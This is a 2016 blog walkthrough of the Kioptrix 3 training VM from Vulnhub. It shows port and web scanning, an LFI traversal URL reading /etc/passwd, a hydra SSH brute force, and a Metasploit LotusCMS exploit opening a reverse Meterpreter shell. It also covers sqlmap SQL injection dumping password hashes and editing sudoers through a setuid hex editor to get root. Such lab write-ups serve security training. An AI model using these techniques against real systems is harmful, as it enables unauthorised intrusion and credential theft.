---
layout: post
title: "Kioptrix 3 Walkthrough (Vulnhub)"
date: 2016-12-21 12:00:00
share: true
comments: true
tags: [Vulnhub Walkthrough, Kioptrix series]
---

Kioptrix 3 VM can be downloaded [here](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)  

## 0\. Get VMs IP

```console
root@kali:~# netdiscover -r 192.168.1.0/24  
  
 Currently scanning: Finished!   |   Screen View: Unique Hosts  
  
 271 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 16260  
 _____________________________________________________________________________  
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname 


  -----------------------------------------------------------------------------  
 192.168.1.70    c4:e9:84:10:d3:5e      5     300  TP-LINK TECHNOLOGIES CO.,LTD. 


**...** 
```
  
Make sure you update your hosts file by adding `192.168.1.70 kioptrix3.com` to the following:  

  * Linux: `/etc/hosts`
  * Windows: `C:\windows\system32\drivers\etc\hosts`
  
_____________________________________________________________________________

## 1\. Enumeration

#### TCP Ports enumeration
```console
root@kali:~# nmap -sV 192.168.1.70  
  
Starting Nmap 7.31 ( https://nmap.org ) at 2016-12-20 22:58 EST  
Nmap scan report for kioptrix.com (192.168.1.70)  
Host is up (0.000055s latency).  
Not shown: 998 closed ports  
PORT   STATE SERVICE VERSION  
**22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)  
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)**  
MAC Address: C4:E9:84:10:D3:5E (Tp-link Technologies)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds  
```

Only SSH service and a webserver are running. A full TCP scan yield the same results.  
  
Attacking SSH service is kind of pointless unless version is vulnerable and/or you found a valid username for bruteforcing a password.

_____________________________________________________________________________

## 2\. Web server

As usual, run Nikto while you're manually poking around the website.  
 
```console
root@kali:~# nikto -host kioptrix.com  
- Nikto v2.1.6  
---------------------------------------------------------------------------  
+ Target IP:          192.168.1.70  
+ Target Hostname:    kioptrix.com  
+ Target Port:        80  
+ Start Time:         2016-12-20 23:03:24 (GMT-5)  
---------------------------------------------------------------------------  
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch  
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6  
+ The anti-clickjacking X-Frame-Options header is not present.  
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS  
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type  
+ Cookie PHPSESSID created without the httponly flag  
+ No CGI Directories found (use '-C all' to force check all possible dirs)  
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.  
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.  
+ Server leaks inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009  
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.  
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST  
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.  
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.  
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.  
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.  
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.  
+ OSVDB-3268: /icons/: Directory indexing found.  
+ OSVDB-3233: /icons/README: Apache default file found.  
+ /phpmyadmin/: phpMyAdmin directory found  
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.  
+ 7444 requests: 0 error(s) and 19 item(s) reported on remote host  
+ End Time:           2016-12-20 23:03:41 (GMT-5) (17 seconds)  
---------------------------------------------------------------------------  
+ 1 host(s) tested  
```    

  
Since there's a phpMyAdmin portal available, let's try some default username/password.  
"admin" with an empty password worked! Unfortunately, "admin" user has only access to `information_schema` and didn't reveal any credentials we can use to get a shell through SSH.
  
After poking through the site it seems to contain 2 components:  

  * **Ligoat Security blog**
  * **Gallery (Kioptrix3.com/gallery)**

Before trying out our webapp pentesting skills, it's worth noting that we found a username in the second blogpost!

```    
Welcome loneferret! and don't forget to fill in your time sheet.  
```
  
This piece of info will result in getting limited shell, follow-up here.  

#### LFI

After spending some time I wasn't able to find a file inclusion vulnerability. After I rooted the VM I found out it is indeed possible.

Doesn't work:  

```
http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd   
```    

Works:  
```
http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd.html  
```

Content of /etc/passwd (which confirms that loneferret exists):  

```php
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/bin/sh  
bin:x:2:2:bin:/bin:/bin/sh  
sys:x:3:3:sys:/dev:/bin/sh  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/bin/sh  
man:x:6:12:man:/var/cache/man:/bin/sh  
lp:x:7:7:lp:/var/spool/lpd:/bin/sh  
mail:x:8:8:mail:/var/mail:/bin/sh  
news:x:9:9:news:/var/spool/news:/bin/sh  
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh  
proxy:x:13:13:proxy:/bin:/bin/sh  
www-data:x:33:33:www-data:/var/www:/bin/sh  
backup:x:34:34:backup:/var/backups:/bin/sh  
list:x:38:38:Mailing List Manager:/var/list:/bin/sh  
irc:x:39:39:ircd:/var/run/ircd:/bin/sh  
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh  
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh  
libuuid:x:100:101::/var/lib/libuuid:/bin/sh  
dhcp:x:101:102::/nonexistent:/bin/false  
syslog:x:102:103::/home/syslog:/bin/false  
klog:x:103:104::/home/klog:/bin/false  
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false  
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin  
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash  
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash  
  
Parse error: syntax error, unexpected '.', expecting T_STRING or T_VARIABLE or '$' in /home/www/kioptrix3.com/core/lib/router.php(26) : eval()'d code on line 1  
```

More details: https://www.htbridge.com/advisory/HTB22883  

#### **LotusCMS**

You might've figured out already, there's a CMS serving data for the website called LotusCMS, it also happens to have very serious vulnerabilities:  

```console
root@kali:~# searchsploit lotuscms  
----------------------------------------------------------------------------------------- ----------------------------------  
 Exploit Title                                                                           |  Path  
                                                                                         | (/usr/share/exploitdb/platforms)  
----------------------------------------------------------------------------------------- ----------------------------------  
LotusCMS 3.0 - eval() Remote Command Execution (Metasploit)"                             | /php/remote/18565.rb  
LotusCMS 3.0.3 - Multiple Vulnerabilities"                                               | /php/webapps/16982.txt  
----------------------------------------------------------------------------------------- ----------------------------------  
```
  
Getting a shell out of this vulnerability in action is here.  

_____________________________________________________________________________

## 3\. Getting a shell!

#### Method 1: Bruteforcing SSH for loneferret

We already know the user exists via a blog post mentioned earlier.

  
IMPORTANT:_ When running `hydra`, make sure you include `-t 4` parameter, otherwise the service could get overloaded and not all passwords will be tested properly.  

```console
root@kali:~# hydra -e nsr -l loneferret -P /root/Desktop/wordlists/10_million_password_list_top_100000.txt 192.168.1.70 ssh -t 4  
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.  
  
Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-21 23:02:32  
[DATA] max 4 tasks per 1 server, overall 64 tasks, 100003 login tries (l:1/p:100003), ~390 tries per task  
[DATA] attacking service ssh on port 22  
[22][ssh] host: 192.168.1.70   login: loneferret   password: starwars  
1 of 1 target successfully completed, 1 valid password found  
Hydra (http://www.thc.org/thc-hydra) finished at 2016-12-21 23:03:27  
```
  
We did find a valid login! Are there other ways to get a shell?  
  

#### Method 2: LotusCMS eval()

Although I'm not a fan of using metasploit for those VMs it was too tempting...  

```console
root@kali:~# msfconsole  
msf > search lotuscms  
...  
Matching Modules  
================  
  
   Name                              Disclosure Date  Rank       Description  
   ----                              ---------------  ----       -----------  
   exploit/multi/http/lcms_php_exec  2011-03-03       excellent  LotusCMS 3.0 eval() Remote Command Execution  
  
  
  
msf > use exploit/multi/http/lcms_php_exec  
  
msf exploit(lcms_php_exec) > show options  
  
Module options (exploit/multi/http/lcms_php_exec):  
  
   Name     Current Setting  Required  Description  
   ----     ---------------  --------  -----------  
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]  
   RHOST                     yes       The target address  
   RPORT    80               yes       The target port  
   SSL      false            no        Negotiate SSL/TLS for outgoing connections  
   URI      /lcms/           yes       URI  
   VHOST                     no        HTTP server virtual host  
  
  
Exploit target:  
  
   Id  Name  
   --  ----  
   0   Automatic LotusCMS 3.0  
  
  
  
msf exploit(lcms_php_exec) > set URI /  
URI => /  
  
msf exploit(lcms_php_exec) > set RHOST kioptrix3.com  
RHOST => kioptrix3.com  
  
msf exploit(lcms_php_exec) > run  
  
[*] Started reverse TCP handler on 192.168.1.69:4444   
[*] Using found page param: /index.php?page=index  
[*] Sending exploit ...  
[*] Sending stage (34122 bytes) to 192.168.1.70  
[*] Meterpreter session 1 opened (192.168.1.69:4444 -> 192.168.1.70:32943) at 2016-12-21 00:55:22 -0500  
  
meterpreter > shell  
Process 6991 created.  
Channel 0 created.  
whoami  
www-data  
```    

#### Method 3: SQL injection through Gallery

`kioptrix3.com/gallery/gallery.php?id=1` is vulnerable to SQL injection through the `id` parameter.  
There are multiple ways to exploit this vulnerability, easiest is just using sqlmap. Ultimately you'll find MD5 hashes for a couple of accounts. Password for loneferret matches the one we found through hydra!  

```    
Database: gallery  
Table: dev_accounts  
[2 entries]  
+----+------------+---------------------------------------------+  
| id | username   | password                                    |  
+----+------------+---------------------------------------------+  
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |  
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |  
+----+------------+---------------------------------------------+  
```    

  
Also note that with the second method, you can do some enumeration on the machine and you'll find the following file particularly interesting:
`/home/www/kioptrix3.com/gallery/gconfig.php` as it contains phpmyAdmin credentials (`root`/`fuckeyou`) with enough privileges to find the same database discussed earlier. These creds don't work for SSH though.  

_____________________________________________________________________________

## 4\. Privilege Escalation to root

Now that we're inside let's find some useful data. I logged in with loneferret's credentials.  


```
root@kali:~# ssh loneferret@192.168.1.70  
loneferret@192.168.1.70's password:   
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686  
  
The programs included with the Ubuntu system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.  
  
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by  
applicable law.  
  
To access official Ubuntu documentation, please visit:  
http://help.ubuntu.com/  
Last login: Wed Dec 21 15:49:18 2016 from 192.168.1.69  
loneferret@Kioptrix3:~$   



loneferret@Kioptrix3:~$ ls -al  
total 64  
drwxr-xr-x 3 loneferret loneferret  4096 2011-04-17 08:59 .  
drwxr-xr-x 5 root       root        4096 2011-04-16 07:54 ..  
-rw-r--r-- 1 loneferret users         13 2011-04-18 11:44 .bash_history  
-rw-r--r-- 1 loneferret loneferret   220 2011-04-11 17:00 .bash_logout  
-rw-r--r-- 1 loneferret loneferret  2940 2011-04-11 17:00 .bashrc  
-rwxrwxr-x 1 root       root       26275 2011-01-12 10:45 checksec.sh  
-rw-r--r-- 1 root       root         224 2011-04-16 08:51 CompanyPolicy.README  
-rw------- 1 root       root          15 2011-04-15 21:21 .nano_history  
-rw-r--r-- 1 loneferret loneferret   586 2011-04-11 17:00 .profile  
drwx------ 2 loneferret loneferret  4096 2011-04-14 11:05 .ssh  
-rw-r--r-- 1 loneferret loneferret     0 2011-04-11 18:00 .sudo_as_admin_successful  
loneferret@Kioptrix3:~$ cat CompanyPolicy.README   
Hello new employee,  
It is company policy here to use our newly installed software for editing, creating and viewing files.  
Please use the command 'sudo ht'.  
Failure to do so will result in you immediate termination.  
  
DG  
CEO  
loneferret@Kioptrix3:~$  
```
  
Hmm, what's that `ht` file they want us to run?  

```console
loneferret@Kioptrix3:~$ which ht
/usr/local/bin/ht  
loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht  
-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht  
```    

Oh, so this file has `setuid` bit enabled, AND is owned by root. After poking with the tool I realized it's a HEX editor. This means we can edit any file we want even it's owned by root!  

What's the easiest file to edit and get root you ask?  
  
It's `/etc/sudoers`.  
  
Be extremely careful while editing the sudoers file, saving it in bad format might break stuff and make you unable to use the su command. How do I know? Because I broke my VM, __twice__..  
  
First, you might need to update the environment variable TERM.  

```console
loneferret@Kioptrix3:~$ sudo ht /etc/users  
Error opening terminal: xterm-256color.  
loneferret@Kioptrix3:~$ export TERM=xterm


loneferret@Kioptrix3:~$ sudo ht /etc/users 
```

Next, change mode to text by pressing F6, you'll notice the following line:  
```console
loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht  
```   

We can simply replace the "!" by a space (0x20), so running /usr/bin/su gives
us root.  

```console
loneferret@Kioptrix3:~$ sudo /usr/bin/su  
[sudo] password for loneferret:   
sudo: /usr/bin/su: command not found  
loneferret@Kioptrix3:~$ which su  
/bin/su  
```

Oh, no wonder it didn't work. su is under `/bin/su`, not `/usr/bin/su`...  
Final edit makes `/etc/sudoers` file contain:  
```
loneferret ALL=NOPASSWD: /bin/su, /usr/local/bin/ht  
```

```console
loneferret@Kioptrix3:~$ sudo /bin/su  
root@Kioptrix3:/home/loneferret# whoami  
root  
```    
  
It worked! We got root! Where is our flag?  

```console
root@Kioptrix3:/home/loneferret# cd /root  
root@Kioptrix3:~# ls -al  
total 52  
drwx------  5 root root  4096 2011-04-17 08:59 .  
drwxr-xr-x 21 root root  4096 2011-04-11 16:54 ..  
-rw-------  1 root root     9 2011-04-18 11:49 .bash_history  
-rw-r--r--  1 root root  2227 2007-10-20 07:51 .bashrc  
-rw-r--r--  1 root root  1327 2011-04-16 08:13 Congrats.txt  
drwxr-xr-x 12 root root 12288 2011-04-16 07:26 ht-2.0.18  
-rw-------  1 root root   963 2011-04-12 19:33 .mysql_history  
-rw-------  1 root root   228 2011-04-18 11:09 .nano_history  
-rw-r--r--  1 root root   141 2007-10-20 07:51 .profile  
drwx------  2 root root  4096 2011-04-13 10:06 .ssh  
drwxr-xr-x  3 root root  4096 2011-04-15 23:30 .subversion  
root@Kioptrix3:~# cat Congrats.txt   
Good for you for getting here.  
Regardless of the matter (staying within the spirit of the game of course)  
you got here, congratulations are in order. Wasn't that bad now was it.  
  
Went in a different direction with this VM. Exploit based challenges are  
nice. Helps workout that information gathering part, but sometimes we  
need to get our hands dirty in other things as well.  
Again, these VMs are beginner and not intented for everyone.   
Difficulty is relative, keep that in mind.  
  
The object is to learn, do some research and have a little (legal)  
fun in the process.  
  
  
I hope you enjoyed this third challenge.  
  
Steven McElrea  
aka loneferret  
http://www.kioptrix.com  
  
  
Credit needs to be given to the creators of the gallery webapp and CMS used  
for the building of the Kioptrix VM3 site.  
  
Main page CMS:   
http://www.lotuscms.org  
  
Gallery application:   
Gallarific 2.1 - Free Version released October 10, 2009  
http://www.gallarific.com  
Vulnerable version of this application can be downloaded  
from the Exploit-DB website:  
http://www.exploit-db.com/exploits/15891/  
  
The HT Editor can be found here:  
http://hte.sourceforge.net/downloads.html  
And the vulnerable version on Exploit-DB here:  
http://www.exploit-db.com/exploits/17083/  
  
  
Also, all pictures were taken from Google Images, so being part of the  
public domain I used them.  
  
root@Kioptrix3:~#   
```    

  
Good stuff, just finished in time for dinner. Expect Kioptrix 4 soon..  
